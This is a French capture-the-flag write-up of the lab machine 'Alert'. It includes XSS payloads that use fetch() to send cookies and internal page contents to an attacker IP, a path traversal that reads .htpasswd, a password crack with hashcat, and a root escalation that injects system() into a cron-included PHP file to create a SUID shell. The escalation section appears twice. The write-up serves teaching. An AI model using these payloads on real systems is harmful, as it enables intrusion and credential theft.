![Cover](cover.png)

# Phase 1 : Reconnaissance & Brèche Initiale

## Énumération Réseau et Services

La phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d'attaque externe.

```bash
# Scan rapide de tous les ports TCP
nmap -p- --min-rate 10000 10.10.11.44 -oN all_ports.nmap

# Scan détaillé des services identifiés
nmap -p 22,80 -sCV 10.10.11.44 -oN targeted.nmap
```

**Résultats :**
*   **Port 22 (SSH) :** OpenSSH 8.2p1 (Ubuntu).
*   **Port 80 (HTTP) :** Apache 2.4.41. Redirection vers `http://alert.htb/`.
*   **Port 12227 :** État `filtered`.

L'analyse des versions suggère une distribution **Ubuntu 20.04 (Focal)**. J'ajoute l'entrée correspondante dans mon fichier `/etc/hosts`.

## Énumération Web et Sous-domaines

Le serveur Apache utilise le **Virtual Hosting**. Je procède à un fuzzing du header `Host` pour découvrir d'éventuels sous-domaines.

```bash
ffuf -u http://10.10.11.44 -H "Host: FUZZ.alert.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac -mc all
```

Le scan révèle `statistics.alert.htb` qui retourne un code **401 Unauthorized** (Basic Authentication). Sans identifiants, je me concentre sur le domaine principal.

### Analyse de l'application `alert.htb`
L'application principale est un **Markdown Viewer** écrit en **PHP**. 
*   **Fonctionnalité :** L'utilisateur soumet du Markdown, et `visualizer.php` affiche le rendu HTML.
*   **Partage :** Un bouton "Share Markdown" génère un lien unique : `visualizer.php?link_share=[ID].md`.
*   **Interaction Admin :** La page "About Us" indique qu'un administrateur consulte les messages envoyés via le formulaire de contact pour corriger les erreurs de rendu.

## Identification du Vecteur : Cross-Site Scripting (XSS)

Puisque l'application convertit du Markdown en HTML, je teste si les balises HTML injectées sont interprétées.

```markdown
### Test XSS
<script>fetch('http://10.10.14.6/log?c=' + document.cookie)</script>
```

En visualisant ce Markdown, le script s'exécute localement. Pour confirmer l'interaction avec l'administrateur, je soumets le lien de partage via le formulaire de contact.

> **Schéma Mental : Chaîne d'attaque XSS vers Arbitrary File Read**
> 1. **Attaquant** : Héberge un script malveillant ou injecte du code JS dans un fichier Markdown.
> 2. **Attaquant** : Envoie l'URL du fichier Markdown partagé à l'**Admin** via le formulaire de contact.
> 3. **Admin** : Consulte l'URL. Son navigateur exécute le JavaScript dans le contexte de `alert.htb`.
> 4. **JavaScript** : Effectue une requête `fetch()` vers une ressource interne (ex: `messages.php`) inaccessible depuis l'extérieur.
> 5. **JavaScript** : Exfiltre le contenu de la ressource vers le serveur de l'**Attaquant**.

## Exploitation : Arbitrary File Read & Directory Traversal

L'énumération par brute-force de répertoires avec `feroxbuster` a révélé un fichier `messages.php` qui semble vide ou restreint.

```bash
feroxbuster -u http://alert.htb -x php
```

Je suspecte que `messages.php` est accessible uniquement par l'administrateur (localhost/internal). J'utilise le **XSS** pour forcer l'admin à lire ce fichier et me le transmettre.

**Payload Markdown injecté :**
```html
<script>
fetch('http://alert.htb/messages.php')
.then(r => r.text())
.then(data => fetch('http://10.10.14.6/exfil?d=' + btoa(data)));
</script>
```

Le contenu décodé de `messages.php` révèle une vulnérabilité de **Directory Traversal** via le paramètre `file` :
`messages.php?file=2024-03-10_15-48-34.txt`

En analysant le code source de `messages.php` (récupéré via le même vecteur XSS), je confirme l'utilisation de `file_get_contents()` sans filtrage adéquat sur le paramètre `file`.

## Extraction des Identifiants et Accès Initial

Je cible la configuration Apache pour localiser le fichier `.htpasswd` du sous-domaine `statistics`.

```bash
# Lecture de la configuration VirtualHost
python3 exploit_xss.py "/etc/apache2/sites-enabled/000-default.conf"
```

Le fichier de configuration indique : `AuthUserFile /var/www/statistics.alert.htb/.htpasswd`. Je récupère le hash via le **Path Traversal** relayé par le **XSS**.

```bash
# Récupération du hash
python3 exploit_xss.py "/var/www/statistics.alert.htb/.htpasswd"
```

**Hash obtenu :** `albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/`

### Cracking de Hash
J'utilise **Hashcat** avec le mode 1600 (Apache MD5).

```bash
hashcat -m 1600 albert.hash /usr/share/wordlists/rockyou.txt
```
Le mot de passe est identifié : **manchesterunited**.

### Premier Shell
Le service SSH est ouvert. Je tente une réutilisation de mot de passe pour l'utilisateur **albert**.

```bash
ssh albert@alert.htb
```
L'authentification réussit. Je stabilise le shell et récupère le flag `user.txt`.

---

### Énumération Interne & Accès Initial (User)

Une fois le hash de l'utilisateur **albert** récupéré via la vulnérabilité de **Directory Traversal** sur le fichier `.htpasswd`, je procède au cassage de celui-ci avec **hashcat**.

```bash
# Identification et cassage du hash MD5 (APR)
hashcat -m 1600 albert.hash /usr/share/wordlists/rockyou.txt
# Résultat : albert:manchesterunited
```

Je valide les informations d'identification via **SSH** pour confirmer l'accès au système.

```bash
# Validation des credentials avec netexec
netexec ssh alert.htb -u albert -p manchesterunited
# Connexion SSH
sshpass -p manchesterunited ssh albert@alert.htb
```

### Énumération Post-Exploitation

L'énumération initiale des privilèges de l'utilisateur ne révèle aucune règle **Sudo** exploitable. Cependant, l'examen des groupes et des fichiers appartenant à des groupes spécifiques montre une configuration intéressante.

```bash
# Vérification des privilèges et groupes
id
# uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)

# Recherche de fichiers accessibles par le groupe 'management'
find / -group management 2>/dev/null
# /opt/website-monitor/config/configuration.php
```

L'utilisateur appartient au groupe **management**, qui possède des droits d'écriture sur un fichier de configuration situé dans `/opt/website-monitor`.

### Analyse du Service Interne & Pivot

L'énumération des processus et des connexions réseau révèle un service web tournant localement avec les privilèges **root**.

```bash
# Analyse des processus et ports en écoute
ps auxww | grep php
# root ... /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor

netstat -tnl
# tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN
```

> **Schéma Mental : Port Forwarding**
> Le service sur le port 8080 n'est pas exposé sur l'interface externe. Pour l'analyser depuis ma machine d'attaque, je dois créer un **SSH Tunnel** (Local Port Forwarding). Ma machine (8888) -> Tunnel SSH -> Alert (127.0.0.1:8080).

```bash
# Mise en place du tunnel SSH
ssh -L 8888:localhost:8080 albert@alert.htb
```

### Escalade de Privilèges (Privilege Escalation)

L'analyse du code source dans `/opt/website-monitor` révèle un script nommé `monitor.php`. Ce script semble conçu pour être exécuté via une **Cron Job** par l'utilisateur **root**.

```php
// Extrait de /opt/website-monitor/monitor.php
include('config/configuration.php');
$monitors = json_decode(file_get_contents(PATH.'/monitors.json'));
// ... logique de monitoring via curl ...
```

Le script utilise la fonction `include()` pour charger `config/configuration.php`. Comme j'ai établi précédemment que ce fichier est scriptable par le groupe **management**, je peux injecter du code PHP arbitraire qui sera exécuté par **root** lors de l'exécution du script de monitoring.

> **Schéma Mental : Abus de Writable Include**
> 1. Le script `monitor.php` appartient à **root** et tourne via **cron**.
> 2. Il inclut `configuration.php`.
> 3. `albert` peut modifier `configuration.php`.
> 4. Injection d'une commande système pour créer un binaire **SetUID**.

#### Exploitation du vecteur de configuration

Je modifie le fichier de configuration pour créer une copie de `/bin/bash` avec le flag **SUID**.

```bash
# Modification du fichier de configuration
nano /opt/website-monitor/config/configuration.php
```

Contenu injecté :
```php
<?php
define('PATH', '/opt/website-monitor');
// Création d'un binaire bash SUID dans /tmp
system('cp /bin/bash /tmp/pwn; chown root:root /tmp/pwn; chmod 6777 /tmp/pwn;');
?>
```

Après avoir attendu l'exécution de la **Cron Job** (généralement chaque minute), je vérifie la présence du binaire et l'exécute pour obtenir un shell **root**.

```bash
# Vérification du binaire SUID
ls -l /tmp/pwn
# -rwsrwsrwx 1 root root ... /tmp/pwn

# Exécution pour obtenir les privilèges root
/tmp/pwn -p
id
# uid=1000(albert) gid=1000(albert) euid=0(root)
```

### Persistence & Cleanup
Une fois l'accès **root** stabilisé, je récupère le flag final et nettoie les traces d'exploitation (suppression du binaire SUID et restauration du fichier `configuration.php`).

```bash
cat /root/root.txt
rm /tmp/pwn
```

---

### Énumération & Analyse des Vecteurs de Privilèges

Une fois l'accès établi en tant qu'utilisateur **albert**, l'énumération locale révèle une configuration de groupe intéressante. L'utilisateur appartient au groupe **management**.

```bash
id
# uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)

find / -group management 2>/dev/null
# /opt/website-monitor/config
# /opt/website-monitor/config/configuration.php
```

L'analyse des processus montre une instance de serveur web PHP interne tournant avec les privilèges **root**, écoutant uniquement sur l'interface **localhost**.

```bash
ps auxww | grep php
# root 1003 0.0 0.6 207012 26288 ? Ss 14:28 0:01 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor

netstat -tnl
# tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN
```

### Pivot Local & Analyse du Code

Pour analyser l'application, j'établis un **SSH Tunneling** (Port Forwarding) afin d'accéder au service distant depuis ma machine locale.

```bash
ssh -L 8888:localhost:8080 albert@alert.htb
```

Dans le répertoire `/opt/website-monitor`, le fichier `monitor.php` semble être conçu pour être exécuté via un **Cron Job** par **root**. Ce script commence par une inclusion critique :

```php
// Extrait de monitor.php
include('config/configuration.php');
$monitors = json_decode(file_get_contents(PATH.'/monitors.json'));
```

Le fichier `configuration.php` est la cible idéale car il appartient au groupe **management** et possède les droits d'écriture pour ce groupe.

> **Schéma Mental :**
> **Root Cron Job** (Exécute monitor.php) -> **PHP Include** (Charge configuration.php) -> **Writable File** (albert peut modifier configuration.php) -> **Code Execution** (Injection de commandes système sous le contexte root).

### Exploitation : Détournement du PHP Include

Je modifie le fichier `configuration.php` pour y injecter une commande système. L'objectif est de créer une copie de `/bin/bash` avec le bit **SUID** activé dans `/tmp`.

```bash
ls -l /opt/website-monitor/config/configuration.php
# -rwxrwxr-x 1 root management 49 Nov 5 14:31 /opt/website-monitor/config/configuration.php

echo "<?php define('PATH', '/opt/website-monitor'); system('cp /bin/bash /tmp/0xdf; chmod +s /tmp/0xdf'); ?>" > /opt/website-monitor/config/configuration.php
```

Après une minute (cycle du **Cron Job**), le binaire **SUID** est généré. Il ne reste plus qu'à l'exécuter en préservant les privilèges.

```bash
/tmp/0xdf -p
# id
# uid=1000(albert) gid=1000(albert) euid=0(root) egid=0(root) groups=0(root),1000(albert),1001(management)
```

---

### Beyond Root : Analyse Post-Exploitation

L'analyse du système après compromission totale permet de comprendre pourquoi certains vecteurs d'attaque initiaux ont échoué.

#### 1. Protection contre le Path Traversal (visualizer.php)
Le paramètre `link_share` semblait vulnérable, mais une **Regular Expression** stricte empêchait toute remontée de répertoire.
```php
if (preg_match('/^[a-zA-Z0-9_.-]+\.md$/', $filename)) { ... }
```
Le filtre n'autorisait que les caractères alphanumériques, les points et les tirets, bloquant ainsi les séquences `../`.

#### 2. Sécurité du paramètre Page (index.php)
Contrairement à une implémentation classique de **LFI**, le développeur a utilisé un **Switch Statement** (Whitelist) au lieu d'une inclusion dynamique basée sur l'entrée utilisateur.
```php
switch ($page) {
    case 'alert': ... break;
    case 'contact': ... break;
    default: echo '<h1>Error: Page not found</h1>'; break;
}
```
Cette approche rend l'exploitation par **Path Traversal** ou **Remote File Inclusion** impossible sur ce paramètre.

#### 3. Assainissement du Formulaire de Contact
Les tentatives d'**XSS** directes via le formulaire de contact ont échoué à cause de l'utilisation combinée de `filter_var` et `htmlspecialchars`.
```php
$email = filter_var($_POST["email"], FILTER_SANITIZE_EMAIL);
$message = htmlspecialchars($_POST["message"]);
```
Ces fonctions neutralisent les balises `<script>` et les caractères spéciaux avant l'écriture dans les fichiers `.txt` consultés par l'administrateur.

#### 4. Le mystère du Port 12227
Le scan **Nmap** indiquait le port 12227 comme `filtered`. L'examen des règles **iptables** confirme une politique de filtrage explicite.
```bash
iptables -L -v
# ACCEPT tcp -- lo any anywhere anywhere tcp dpt:12227
# DROP   tcp -- any any anywhere anywhere tcp dpt:12227
```
Le trafic n'est accepté que s'il provient de l'interface **loopback** (`lo`). Bien qu'aucun service ne soit actuellement à l'écoute sur ce port, la règle reste active, provoquant l'absence de réponse (DROP) aux paquets SYN externes, ce qui explique le statut `filtered`.